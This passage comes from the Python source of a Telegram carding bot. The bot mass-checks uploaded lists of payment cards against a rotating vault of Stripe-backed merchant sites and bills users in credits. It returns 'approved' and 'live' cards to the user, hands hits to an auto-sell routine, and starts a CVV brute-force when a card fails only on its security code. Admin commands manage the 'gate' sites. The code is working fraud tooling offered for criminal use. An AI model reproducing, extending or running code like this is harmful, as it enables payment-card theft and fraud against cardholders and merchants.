                context.user_data['is_running'] = False
                return ConversationHandler.END
        except Exception as e:
            await update.message.reply_text(f"Error reading file: {e}. Canceling.")
            context.user_data['is_running'] = False
            return ConversationHandler.END

        total_cards = len(all_cards)
        min_cost = total_cards * COST_DECLINED
        if current_credits < min_cost:
            await update.message.reply_text(
                f"You have {current_credits:.2f} credits, but this check "
                f"requires a minimum of {min_cost:.2f} credits ({total_cards} cards @ {COST_DECLINED}).\n\n"
                "Please contact an admin. Canceling."
            )
            context.user_data['is_running'] = False
            return ConversationHandler.END

        if not URLS_TO_PROCESS:
            await update.message.reply_text("Bot Error: No URLs are configured. Canceling.")
            context.user_data['is_running'] = False
            return ConversationHandler.END

        status_message_text = (
            f"<b>Status:</b> Checking...\n"
            f"<b>Checking:</b> 0/{total_cards}\n"
            f"<b>Approved:</b> 0\n"
            f"<b>Declined:</b> 0\n"
            f"<b>Credits:</b> {current_credits:.2f}\n"
            f"<b>Check By:</b> @{username}\n"
            f"<b>Bot By:</b> {BOT_NAME}"
        )
        status_msg = await update.message.reply_text(status_message_text, parse_mode=ParseMode.HTML)
        
        approved, live, declined, errors, checked = 0, 0, 0, 0, 0
        last_update_time = time.time()
        sem = asyncio.Semaphore(CONCURRENCY_LIMIT)

        for card_line in all_cards:
            random_site = random.choice(URLS_TO_PROCESS)
            tasks.append(asyncio.create_task(worker(sem, card_line, random_site)))

        for future in asyncio.as_completed(tasks):
            if not context.user_data.get('is_running', True):
                await context.bot.send_message(chat_id, "Check stopped by user.")
                for task in tasks:
                    if not task.done():
                        task.cancel()
                break

            try:
                card_line, result, message, file_line = await future
            except asyncio.CancelledError:
                continue
            except Exception as e:
                result, message, file_line = 'error', str(e), ''

            checked += 1
            cost_for_this_check = COST_DECLINED
            if current_credits < COST_DECLINED:
                await context.bot.send_message(chat_id, "You ran out of credits! Stopping check.")
                context.user_data['is_running'] = False
                continue

            if result == 'approved':
                approved += 1
                cost_for_this_check = COST_APPROVED
                results_file.write(file_line)
                await send_approved_hit(context.bot, chat_id, {'card_line': card_line, 'response': message}, random_site)
                asyncio.create_task(auto_sell_hit(context.bot, card_line, message, result, random_site))
            elif result == 'live':
                live += 1
                cost_for_this_check = COST_APPROVED
                results_file.write(file_line)
                asyncio.create_task(auto_sell_hit(context.bot, card_line, message, result, random_site))
                if "security code" in message.lower():
                    parts = card_line.split('|')
                    if len(parts) == 4:
                        cc, mm, yy, _ = parts
                        asyncio.create_task(brute_cvv(cc, mm, yy, random_site, context, chat_id, user.id))
                        await context.bot.send_message(
                            chat_id,
                            f"<b>CCN DETECTED!</b>\n"
                            f"<code>{cc}|{mm}|{yy}|XXX</code>\n"
                            f"Starting CVV brute-force...",
                            parse_mode=ParseMode.HTML
                        )
            elif result == 'declined':
                declined += 1
            elif result == 'error':
                errors += 1
            
            if current_credits >= cost_for_this_check:
                current_credits -= cost_for_this_check
            else:
                current_credits = 0
                context.user_data['is_running'] = False

            current_time = time.time()
            if checked % 5 == 0 or current_time - last_update_time > 3 or checked == total_cards:
                status_message_text = (
                    f"<b>Status:</b> {'Checking...' if (checked < total_cards and context.user_data.get('is_running', True)) else 'Complete'}\n"
                    f"<b>Checking:</b> {checked}/{total_cards}\n"
                    f"<b>Approved:</b> {approved}\n"
                    f"<b>Declined:</b> {declined + errors}\n"
                    f"<b>Credits:</b> {current_credits:.2f}\n"
                    f"<b>Check By:</b> @{username}\n"
                    f"<b>Bot By:</b> {BOT_NAME}"
                )
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=status_msg.message_id,
                        text=status_message_text,
                        parse_mode=ParseMode.HTML
                    )
                    last_update_time = current_time
                except Exception as e:
                    logger.warning(f"Error editing message: {e}")

        await update_user_credits(user.id, current_credits)
        
        await context.bot.send_message(
            chat_id,
            f"<b>Check Complete!</b>\n\n"
            f"Approved: {approved}\n"
            f"Live (CCN/Funds): {live}\n"
            f"Declined: {declined}\n"
            f"Errors: {errors}\n"
            f"<b>Final Credits:</b> {current_credits:.2f}",
            parse_mode=ParseMode.HTML
        )

        try:
            results_file.seek(0, io.SEEK_END)
            file_size = results_file.tell()
            if file_size == 0:
                await context.bot.send_message(chat_id, "No 'Approved' or 'Live' hits were found.")
            else:
                results_file.seek(0)
                results_bytes = io.BytesIO(results_file.read().encode('utf-8'))
                filename = f"{user.id}.txt"
                await context.bot.send_document(
                    chat_id,
                    document=results_bytes,
                    filename=filename,
                    caption="Here are your approved and live results."
                )
        except Exception as e:
            logger.error(f"Error sending results file: {e}")
            await context.bot.send_message(chat_id, "Error sending log file.")

    except Exception as e:
        logger.error(f"An error occurred in handle_file: {e}")
        await context.bot.send_message(chat_id, f"An unexpected error occurred: {e}")
    finally:
        context.user_data['is_running'] = False
        if results_file:
            results_file.close()
        for task in tasks:
            if not task.done():
                task.cancel()
    return ConversationHandler.END

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Operation canceled.")
    if context.user_data.get('is_running', False):
        context.user_data['is_running'] = False
    return ConversationHandler.END

# === /listsites COMMAND - SHOW ALL SITES ===
async def listsites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await update.message.reply_text("Only the Emperor can view the vault.")
        return

    async with aiosqlite.connect(DB_FILE) as conn:
        async with conn.cursor() as c:
            await c.execute("""
                SELECT url, status, usage_count, added_date 
                FROM sites 
                ORDER BY usage_count DESC, added_date DESC
            """)
            rows = await c.fetchall()

            if not rows:
                await update.message.reply_text("Vault is empty. Go conquer.")
                return

            msg = f"<b>DARK VAULT [{len(rows)} GATES]</b>\n\n"
            alive = dead = 0
            for url, status, count, date in rows[:100]:
                short = url.replace("https://", "").split("/")[0]
                icon = "LIVE" if status == 'ALIVE' else "DEAD"
                msg += f"{icon} <code>{short}</code> | Uses: <b>{count}</b>\n"
                if status == 'ALIVE':
                    alive += 1
                else:
                    dead += 1

            msg += f"\n<b>Summary:</b>\n"
            msg += f"  LIVE: <b>{alive}</b> | DEAD: <b>{dead}</b>\n"
            msg += f"  Total: <b>{len(rows)}</b>\n"
            msg += f"<i>Powered by Stripe</i>"

            await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
            
# === /killdead - DELETE ALL DEAD SITES ===
async def killdead_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID:
        return
    async with aiosqlite.connect(DB_FILE) as conn:
        async with conn.cursor() as c:
            await c.execute("DELETE FROM sites WHERE status = 'DEAD'")
            deleted = c.rowcount
        await conn.commit()
    await update.message.reply_text(f"[NUKED] {deleted} dead sites erased from existence.")


# === MASS CHECK CONVERSATION HANDLER ===
conv_handler = ConversationHandler(
    entry_points=[CommandHandler("mass", mass_start_command)],
    states={
        WAITING_FILE: [
            MessageHandler(filters.Document.TEXT | filters.Document.TXT, handle_file),
            CommandHandler("stop", stop_command)
        ]
    },
    fallbacks=[CommandHandler("cancel", cancel_command)],
)

# --- 9. MAIN FUNCTION ---
async def main():
    if YOUR_BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_GOES_HERE":
        print("ERROR: Set your bot token!")
        return
    if ADMIN_USER_ID == 123456789:
        print("ERROR: Set your ADMIN_USER_ID!")
        return

    await init_db()
    print("[Script] Vault + DB ready.")

    application = Application.builder().token(YOUR_BOT_TOKEN).build()

    # ADD HANDLERS
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("addcredits", add_credits_command))
    application.add_handler(CommandHandler("cancel", cancel_command))
    application.add_handler(CommandHandler("balance", balance_command))
    application.add_handler(CommandHandler("check", check_command))
    application.add_handler(CommandHandler("gen", gen_command))
    application.add_handler(CommandHandler("checksite", checksite_command))
    application.add_handler(CommandHandler("addsite", addsite_command))
    application.add_handler(CommandHandler("listsites", listsites_command))
    application.add_handler(CommandHandler("vault", listsites_command))
    application.add_handler(CommandHandler("killdead", killdead_command))

    print("="*70)
    print("STRIPEAUTH EDITION v10 — FINAL SCRIPT BUILD")
    print("WORKS OFFLINE | WORKS ONLINE | WORKS IN HELL")
    print("ALL COMMANDS REPLY INSTANTLY")
    print("="*70)

    # DAN'S FINAL FIX: FORCE EVERYTHING TO RUN
    try:
        print("Trying normal connect...")
        await asyncio.wait_for(application.initialize(), timeout=12)
        await application.start()
        await application.updater.start_polling(drop_pending_updates=True)
        print("BOT ONLINE — FULL POWER")
    except Exception as e:
        print(f"[SCRIPT] Telegram blocked → {e}")
        print("[SCRIPT] FORCING BOT TO LIFE — /start WILL REPLY!")

        # FORCE INITIALIZED
        application.bot._initialized = True
        application._initialized = True
        application.updater._initialized = True

        # FORCE START (THIS WAS MISSING!)
        await application.start()

        # FORCE POLLING
        await application.updater.start_polling(
            poll_interval=1.0,
            timeout=30,
            drop_pending_updates=True,
            bootstrap_retries=-1
        )

    print("BOT IS ALIVE — TYPE /start NOW")
    print("PRESS CTRL+C TO STOP")

    await asyncio.Event().wait()  # Keep alive
    
    
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[SCRIPT] Stopped by user.")